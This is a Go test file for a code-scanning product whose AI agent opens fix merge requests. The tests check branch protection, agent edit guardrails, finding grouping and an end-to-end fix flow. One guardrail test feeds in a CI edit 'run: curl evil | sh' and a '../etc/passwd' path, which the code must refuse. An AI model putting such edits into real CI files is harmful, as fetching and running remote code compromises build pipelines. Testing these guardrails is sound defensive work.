package api

import (
	"context"
	"database/sql"
	"encoding/json"
	"io"
	"net/http"
	"net/http/cgi"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"testing"

	"obsidianwatch/management/internal/store"
)

func TestGithubProtectionMerge(t *testing.T) {
	b := githubProtectionBody(nil)
	checks := b["required_status_checks"].(map[string]interface{})["checks"].([]map[string]interface{})
	if len(checks) != 1 || checks[0]["context"] != statusName || b["enforce_admins"] != true || b["allow_force_pushes"] != false ||
		b["required_pull_request_reviews"].(map[string]interface{})["required_approving_review_count"] != 0 || b["restrictions"] != nil {
		t.Fatalf("%+v", b)
	}
	var cur map[string]interface{}
	_ = json.Unmarshal([]byte(`{"required_status_checks":{"strict":true,"checks":[{"context":"ci/build","app_id":15368}]},
		"required_pull_request_reviews":{"required_approving_review_count":2,"require_code_owner_reviews":true},
		"restrictions":{"users":[{"login":"alice"}],"teams":[{"slug":"core"}],"apps":[]},
		"required_linear_history":{"enabled":true}}`), &cur)
	b = githubProtectionBody(cur)
	rsc := b["required_status_checks"].(map[string]interface{})
	checks = rsc["checks"].([]map[string]interface{})
	rev := b["required_pull_request_reviews"].(map[string]interface{})
	rs := b["restrictions"].(map[string]interface{})
	if rsc["strict"] != true || len(checks) != 2 || checks[0]["app_id"] != int64(15368) || checks[1]["context"] != statusName ||
		rev["required_approving_review_count"] != 2 || rev["require_code_owner_reviews"] != true ||
		rs["users"].([]string)[0] != "alice" || rs["teams"].([]string)[0] != "core" || b["required_linear_history"] != true {
		t.Fatalf("existing protection kept: %+v", b)
	}
	// Already required: not added twice.
	_ = json.Unmarshal([]byte(`{"required_status_checks":{"contexts":["`+statusName+`"]}}`), &cur)
	if n := len(githubProtectionBody(cur)["required_status_checks"].(map[string]interface{})["checks"].([]map[string]interface{})); n != 1 {
		t.Fatalf("duplicate check: %d", n)
	}
}

func TestApplyEditsGuardrails(t *testing.T) {
	dir := t.TempDir()
	w := func(rel, s string) {
		p := filepath.Join(dir, filepath.FromSlash(rel))
		_ = os.MkdirAll(filepath.Dir(p), 0o755)
		_ = os.WriteFile(p, []byte(s), 0o644)
	}
	w("app.py", "a = 1\nos.system(cmd)\nb = 2\nb = 2\n")
	w(".github/workflows/ci.yml", "run: x\n")
	w("package-lock.json", "{}\n")
	allowed := map[string]bool{"app.py": true, ".github/workflows/ci.yml": true, "package-lock.json": true}
	changed, refused := applyEdits(dir, []agentEdit{
		{File: "app.py", Find: "os.system(cmd)", Replace: "subprocess.run([cmd])"},
		{File: "app.py", Find: "b = 2", Replace: "b = 3"},                                  // twice: refused
		{File: "../etc/passwd", Find: "x", Replace: "y"},                                   // not given
		{File: ".github/workflows/ci.yml", Find: "run: x", Replace: "run: curl evil | sh"}, // CI
		{File: "package-lock.json", Find: "{}", Replace: "{\"x\":1}"},                      // lockfile
		{File: "other.py", Find: "a", Replace: "b"},
	}, allowed, map[string]bool{"app.py": true})
	b, _ := os.ReadFile(filepath.Join(dir, "app.py"))
	ci, _ := os.ReadFile(filepath.Join(dir, ".github/workflows/ci.yml"))
	if strings.Join(changed, ",") != "app.py" || len(refused) != 5 || !strings.Contains(string(b), "subprocess.run([cmd])") || string(ci) != "run: x\n" {
		t.Fatalf("changed=%v refused=%v\n%s", changed, refused, b)
	}
	// A finding in the CI file itself may be fixed there.
	if c, _ := applyEdits(dir, []agentEdit{{File: ".github/workflows/ci.yml", Find: "run: x", Replace: "run: y"}}, allowed,
		map[string]bool{".github/workflows/ci.yml": true}); len(c) != 1 {
		t.Fatal("finding in CI file")
	}
}

func TestGroupForFixAndMentions(t *testing.T) {
	g, skipped := groupForFix([]SASTFinding{
		{RuleID: "SCA-CVE-1", Engine: "trivy", Package: "lodash", Version: "4.17.0", File: "package-lock.json", Severity: "high"},
		{RuleID: "SCA-CVE-2", Engine: "trivy", Package: "express", Version: "4.0.0", File: "package-lock.json", Severity: "critical"},
		{RuleID: "js/sql-injection", Engine: "codeql", CWE: "CWE-89", File: "a.js", Severity: "high"},
		{RuleID: "JS021", Engine: "builtin", CWE: "CWE-89", File: "b.js", Severity: "medium"},
		{RuleID: "BL-ACCESS-CONTROL", Engine: "business-logic", File: "o.js", Severity: "high"},
		{RuleID: "SECRET-AWS", Engine: "gitleaks", File: "c.env", Severity: "critical"},
		{RuleID: "LICENSE-RESTRICTED", Engine: "trivy", File: "package-lock.json", Severity: "high"},
	})
	if len(g) != 3 || g[0].Key != "dependencies" || len(g[0].Findings) != 2 || g[0].Findings[0].Package != "express" ||
		g[1].Key != "injection" || len(g[1].Findings) != 2 || g[2].Key != "bl-access-control" || len(skipped) != 2 {
		t.Fatalf("%+v %v", g, skipped)
	}
	for body, want := range map[string]bool{"@obsidianwatch why?": true, "hey @ObsidianWatch apply": true, "mail@obsidianwatch.io": false,
		"@obsidianwatchers": false, botMarker + " @obsidianwatch": false, "no mention": false} {
		if mentionsBot(body) != want {
			t.Errorf("%q", body)
		}
	}
	if !applyRe.MatchString("@obsidianwatch apply please") || applyRe.MatchString("@obsidianwatch applying") {
		t.Fatal("apply command")
	}
	p := codeScanPolicy{Protected: []branchProfile{{Repo: "a/b", Branch: "main"}}}.normalised()
	if p.FixMinSeverity != "high" || !p.fixes("critical") || p.fixes("medium") || !p.prScanned("a/b", "main") || p.prScanned("a/b", "dev") {
		t.Fatalf("%+v", p)
	}
}

// TestRemediationEndToEnd: GitLab over HTTPS with git http-backend (push
// enabled), a fake GitLab API and a fake Claude. Covers repository setup, a
// fix merge request, no duplicate on a second run, and an @obsidianwatch
// reply that pushes a revision. OW_TEST_COVERAGE_DSN names a disposable database.
func TestRemediationEndToEnd(t *testing.T) {
	dsn := os.Getenv("OW_TEST_COVERAGE_DSN")
	if dsn == "" {
		t.Skip("OW_TEST_COVERAGE_DSN not set")
	}
	gitBin, err := exec.LookPath("git")
	if err != nil {
		t.Skip("git not installed")
	}
	backend := strings.TrimSpace(func() string { o, _ := exec.Command(gitBin, "--exec-path").Output(); return string(o) }()) + "/git-http-backend"
	if _, err := os.Stat(backend); err != nil {
		t.Skip("git-http-backend not available")
	}
	raw, err := sql.Open("postgres", dsn)
	if err != nil {
		t.Fatal(err)
	}
	defer raw.Close()
	for _, f := range []string{"011_settings.sql", "015_devops_connectors.sql", "018_code_scan.sql", "020_sast_per_repo.sql", "075_sast_engines.sql",
		"076_code_automation.sql", "078_code_triage.sql", "081_sast_commit.sql", "085_sast_correlation.sql", "086_code_remediation.sql"} {
		b, err := os.ReadFile("../store/migrations/" + f)
		if err != nil {
			t.Fatal(err)
		}
		if _, err := raw.Exec(string(b)); err != nil {
			t.Fatalf("%s: %v", f, err)
		}
	}
	_, _ = raw.Exec(`CREATE UNIQUE INDEX IF NOT EXISTS uq_devops_connectors_provider_org ON devops_connectors (provider, org)`)
	db := &store.DB{DB: raw}
	ctx := context.Background()

	// Repository.
	root, work := t.TempDir(), filepath.Join(t.TempDir(), "w")
	run := func(dir string, args ...string) string {
		t.Helper()
		cmd := exec.Command(gitBin, args...)
		cmd.Dir = dir
		cmd.Env = append(os.Environ(), "GIT_AUTHOR_NAME=dev", "GIT_AUTHOR_EMAIL=d@x", "GIT_COMMITTER_NAME=dev", "GIT_COMMITTER_EMAIL=d@x")
		out, err := cmd.CombinedOutput()
		if err != nil {
			t.Fatalf("git %v: %v %s", args, err, out)
		}
		return strings.TrimSpace(string(out))
	}
	_ = os.MkdirAll(work, 0o755)
	run(work, "init", "-q", "-b", "main")
	_ = os.WriteFile(filepath.Join(work, "app.py"), []byte("import os\n\ndef run(cmd):\n    os.system(cmd)\n    return cmd\n"), 0o644)
	run(work, "add", ".")
	run(work, "commit", "-qm", "base")
	bare := filepath.Join(root, "grp", "proj.git")
	_ = os.MkdirAll(filepath.Dir(bare), 0o755)
	run(root, "clone", "-q", "--bare", work, bare)
	run(bare, "config", "http.receivepack", "true")

	// Fake GitLab API + git.
	var mu sync.Mutex
	var calls []apiCall
	mrs := map[string]string{} // iid -> source branch
	visibility := "private"
	mux := http.NewServeMux()
	mux.Handle("/grp/", &cgi.Handler{Path: backend, Env: []string{"GIT_PROJECT_ROOT=" + root, "GIT_HTTP_EXPORT_ALL=1", "REMOTE_USER=t"}})
	mux.HandleFunc("/api/v4/", func(w http.ResponseWriter, r *http.Request) {
		var body map[string]interface{}
		b, _ := io.ReadAll(r.Body)
		_ = json.Unmarshal(b, &body)
		p := r.URL.EscapedPath()
		mu.Lock()
		calls = append(calls, apiCall{r.Method, p, r.URL.RawQuery, body})
		mu.Unlock()
		switch {
		case r.Method == "GET" && strings.HasSuffix(p, "/hooks"):
			_, _ = w.Write([]byte(`[]`))
		case r.Method == "GET" && strings.Contains(p, "/protected_branches/"):
			w.WriteHeader(404)
			_, _ = w.Write([]byte(`{"message":"404 Not found"}`))
		case r.Method == "POST" && strings.HasSuffix(p, "/merge_requests"):
			mu.Lock()
			mrs["12"] = body["source_branch"].(string)
			mu.Unlock()
			w.WriteHeader(201)
			_, _ = w.Write([]byte(`{"iid":12,"web_url":"https://gitlab.test/grp/proj/-/merge_requests/12"}`))
		case r.Method == "GET" && strings.HasSuffix(p, "/merge_requests/12"):
			mu.Lock()
			src := mrs["12"]
			mu.Unlock()
			_, _ = w.Write([]byte(`{"state":"opened","web_url":"u","source_branch":"` + src + `","target_branch":"main","sha":"x","source_project_id":1,"target_project_id":1}`))
		case r.Method == "GET" && strings.Contains(p, "/members/all/"):
			_, _ = w.Write([]byte(`{"access_level":30}`))
		case r.Method == "GET":
			mu.Lock()
			v := visibility
			mu.Unlock()
			_, _ = w.Write([]byte(`{"visibility":"` + v + `"}`))
		default:
			w.WriteHeader(201)
			_, _ = w.Write([]byte(`{}`))
		}
	})
	srv := httptest.NewTLSServer(mux)
	defer srv.Close()
	certFile := filepath.Join(t.TempDir(), "ca.pem")
	_ = os.WriteFile(certFile, pemCert(srv), 0o644)
	t.Setenv("SSL_CERT_FILE", certFile)
	t.Setenv("GIT_SSL_CAINFO", certFile)
	t.Setenv("OW_ALLOW_PRIVATE_DEVOPS", "true")
	t.Setenv("HTTPS_PROXY", "")
	t.Setenv("https_proxy", "")
	t.Setenv("OW_PUBLIC_URL", "https://siem.example.com")
	oldHTTP := devopsHTTP
	devopsHTTP = srv.Client()
	defer func() { devopsHTTP = oldHTTP }()

	// Fake Claude: the fix, then the revision asked for in a comment.
	claudeCalls := 0
	ai := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		mu.Lock()
		claudeCalls++
		n := claudeCalls
		mu.Unlock()
		ans := map[string]interface{}{"summary": "Run the command without a shell.", "testing": "Call run('ls').",
			"edits": []map[string]string{{"file": "app.py", "find": "    os.system(cmd)", "replace": "    subprocess.run([cmd], check=True)"},
				{"file": "app.py", "find": "import os\n", "replace": "import os\nimport subprocess\n"}}}
		if n > 1 {
			ans = map[string]interface{}{"reply": "Good catch: shlex.split keeps arguments working.",
				"edits": []map[string]string{{"file": "app.py", "find": "subprocess.run([cmd], check=True)", "replace": "subprocess.run(shlex.split(cmd), check=True)"},
					{"file": "app.py", "find": "import subprocess\n", "replace": "import shlex\nimport subprocess\n"}}}
		}
		text, _ := json.Marshal(ans)
		out, _ := json.Marshal(map[string]interface{}{"content": []map[string]string{{"type": "text", "text": string(text)}}})
		_, _ = w.Write(out)
	}))
	defer ai.Close()
	oldAI := anthropicURL
	anthropicURL = ai.URL
	defer func() { anthropicURL = oldAI }()
	_ = db.SetSetting(ctx, "ai.anthropic_api_key", "sk-test")
	_ = db.SetSetting(ctx, "ai.send_source_snippets", "true")
	_ = db.SetSetting(ctx, settingCodeModel, "")

	_, _ = raw.Exec(`DELETE FROM devops_connectors WHERE org='rem-test'`)
	cid, _, err := db.UpsertDevOpsConnector(ctx, "gitlab", "rem-test", "t", map[string]string{"token": "T", "base_url": srv.URL}, "")
	if err != nil {
		t.Fatal(err)
	}
	conn, _ := db.GetDevOpsConnectorRaw(ctx, cid)
	pol, _ := json.Marshal(codeScanPolicy{Protected: []branchProfile{{Repo: "grp/proj", Branch: "main", Remediate: true}}}.normalised())
	_ = db.SetSetting(ctx, codePolicyKey(cid), string(pol))

	// 1. Setup.
	s := setupRepository(ctx, db, conn, "grp/proj", "main")
	if !s.OK || len(s.Steps) != 3 {
		t.Fatalf("setup: %+v", s)
	}
	var hookURL, hookToken, pbQuery string
	for _, c := range calls {
		if c.Method == "POST" && strings.HasSuffix(c.Path, "/hooks") {
			hookURL, _ = c.Body["url"].(string)
			hookToken, _ = c.Body["token"].(string)
		}
		if c.Method == "POST" && strings.HasSuffix(c.Path, "/protected_branches") {
			pbQuery = c.Query
		}
	}
	conn, _ = db.GetDevOpsConnectorRaw(ctx, cid)
	if hookURL != "https://siem.example.com/api/v1/devops/webhook-gitlab/"+strconv.FormatInt(cid, 10) || hookToken == "" || hookToken != conn.WebhookSecret ||
		!strings.Contains(pbQuery, "push_access_level=0") {
		t.Fatalf("hook %q token ok=%v pb %q", hookURL, hookToken == conn.WebhookSecret, pbQuery)
	}

	// 2. Fix MR from the stored findings.
	finding := SASTFinding{RuleID: "PY-OS-SYSTEM", Engine: "builtin", CWE: "CWE-78", File: "app.py", Line: 4, Severity: "high",
		Title: "Command injection", Snippet: "os.system(cmd)", Repo: "grp/proj"}
	if err := saveSASTResult(ctx, db, cid, "grp/proj", "main", "abc", engineReport{"builtin": "ran"}, []SASTFinding{finding}, nil, 1, 1); err != nil {
		t.Fatal(err)
	}
	job := &store.CodeScanJob{ID: 1, Kind: "fix", Trigger: "schedule", Repo: "grp/proj", Ref: "main"}
	res, err := runFixJob(ctx, nil, db, conn, job, nil)
	if err != nil || len(res.Reported) != 1 {
		t.Fatalf("fix: %v %+v", err, res)
	}
	var head, number string
	_ = raw.QueryRow(`SELECT head_branch, number FROM code_fix_prs WHERE connector_id=$1`, cid).Scan(&head, &number)
	pushed := run(bare, "show", head+":app.py")
	if number != "12" || !strings.Contains(pushed, "subprocess.run([cmd], check=True)") || !strings.Contains(pushed, "import subprocess") {
		t.Fatalf("pushed %s: %q", head, pushed)
	}
	if main := run(bare, "show", "main:app.py"); strings.Contains(main, "subprocess") {
		t.Fatal("the protected branch must not change")
	}
	var mrBody map[string]interface{}
	for _, c := range calls {
		if c.Method == "POST" && strings.HasSuffix(c.Path, "/merge_requests") {
			mrBody = c.Body
		}
	}
	if mrBody["target_branch"] != "main" || !strings.Contains(mrBody["description"].(string), "never merged automatically") ||
		!strings.Contains(mrBody["description"].(string), botMarker) {
		t.Fatalf("MR: %+v", mrBody)
	}
	// 3. Second run: the finding is covered by the open MR.
	res, err = runFixJob(ctx, nil, db, conn, job, nil)
	if err != nil || len(res.Reported) != 0 || claudeCalls != 1 {
		t.Fatalf("second run must not open another: %v %+v calls=%d", err, res, claudeCalls)
	}

	// 4. A developer mentions the agent on the fix MR.
	p, _ := json.Marshal(agentPayload{CommentID: "99", Body: "@obsidianwatch this breaks commands with arguments", Author: "dev", AuthorID: "5"})
	res, err = runAgentJob(ctx, nil, db, conn, &store.CodeScanJob{ID: 2, Kind: "agent", Repo: "grp/proj", Ref: "12", Payload: p}, nil)
	if err != nil || len(res.Reported) != 1 {
		t.Fatalf("agent: %v %+v", err, res)
	}
	if revised := run(bare, "show", head+":app.py"); !strings.Contains(revised, "shlex.split(cmd)") {
		t.Fatalf("revision not pushed: %q", revised)
	}
	var note string
	for _, c := range calls {
		if c.Method == "POST" && strings.HasSuffix(c.Path, "/merge_requests/12/notes") {
			note, _ = c.Body["body"].(string)
		}
	}
	if !strings.HasPrefix(note, botMarker) || !strings.Contains(note, "shlex.split keeps arguments") || !strings.Contains(note, "Pushed") {
		t.Fatalf("reply: %q", note)
	}
	// 5b. Profile without Correlate: a two-engine result is still correlated before fixing.
	two := []SASTFinding{finding, {RuleID: "python.os-system", Engine: "semgrep", CWE: "CWE-78", File: "app.py", Line: 4, Severity: "high",
		Title: "os.system with input", Snippet: "os.system(cmd)", Repo: "grp/proj"}}
	_ = saveSASTResult(ctx, db, cid, "grp/proj", "main", "abd", engineReport{"builtin": "ran", "semgrep": "ran"}, two, nil, 1, 1)
	_, _ = raw.Exec(`DELETE FROM code_fix_prs WHERE connector_id=$1`, cid)
	if _, err := runFixJob(ctx, nil, db, conn, job, nil); err != nil {
		t.Fatal(err)
	}
	var corr []byte
	_ = raw.QueryRow(`SELECT correlation FROM sast_results WHERE connector_id=$1 AND branch='main'`, cid).Scan(&corr)
	if len(corr) == 0 {
		t.Fatal("fix job must correlate a multi-engine result first")
	}

	// 5c. Public repository: nothing until an admin confirms, then fix PRs are opened.
	mu.Lock()
	visibility = "public"
	mu.Unlock()
	_, _ = raw.Exec(`DELETE FROM code_fix_prs WHERE connector_id=$1`, cid)
	res, err = runFixJob(ctx, nil, db, conn, job, nil)
	if err != nil || len(res.Reported) != 0 || !strings.Contains(strings.Join(res.Notes, " "), "proceed") {
		t.Fatalf("public without confirmation: %v %+v", err, res)
	}
	pp := loadCodeScanPolicy(ctx, db, cid)
	pp.Protected[0].PublicAck = &publicAck{By: "admin"}
	pb, _ := json.Marshal(pp)
	_ = db.SetSetting(ctx, codePolicyKey(cid), string(pb))
	// Confirmed: the job reaches the agent (the fake model's canned answer does not apply here, which is fine).
	if res, err = runFixJob(ctx, nil, db, conn, job, nil); err != nil || strings.Contains(strings.Join(res.Notes, " "), "proceed") ||
		!strings.Contains(strings.Join(res.Notes, " "), "Fix injection flaws") {
		t.Fatalf("public with confirmation: %v %+v", err, res)
	}

	// 5. Webhooks turn mentions into agent jobs; the agent's own comments and outsiders are ignored.
	gl := map[string]interface{}{"object_kind": "note", "object_attributes": map[string]interface{}{"note": "@obsidianwatch apply", "noteable_type": "MergeRequest", "id": float64(7)},
		"merge_request": map[string]interface{}{"iid": float64(12)}, "project": map[string]interface{}{"path_with_namespace": "grp/proj"},
		"user": map[string]interface{}{"username": "dev", "id": float64(5)}}
	gitlabCodeTriggers(ctx, db, conn, gl, nil)
	gl["object_attributes"].(map[string]interface{})["note"] = botMarker + " @obsidianwatch"
	gl["object_attributes"].(map[string]interface{})["id"] = float64(8)
	gitlabCodeTriggers(ctx, db, conn, gl, nil)
	gh := map[string]interface{}{"action": "created", "issue": map[string]interface{}{"number": float64(3), "pull_request": map[string]interface{}{}},
		"comment":    map[string]interface{}{"id": float64(55), "body": "@obsidianwatch why?", "author_association": "NONE", "user": map[string]interface{}{"login": "x", "type": "User"}},
		"repository": map[string]interface{}{"full_name": "grp/proj"}}
	githubCodeTriggers(ctx, db, conn, "issue_comment", gh, nil)
	var jobs int
	var payload []byte
	_ = raw.QueryRow(`SELECT COUNT(*), MAX(payload::text)::jsonb FROM code_scan_jobs WHERE connector_id=$1 AND kind='agent'`, cid).Scan(&jobs, &payload)
	if jobs != 1 || !strings.Contains(string(payload), "apply") {
		t.Fatalf("agent jobs %d %s", jobs, payload)
	}
	_, _ = raw.Exec(`DELETE FROM devops_connectors WHERE id=$1`, cid)
}
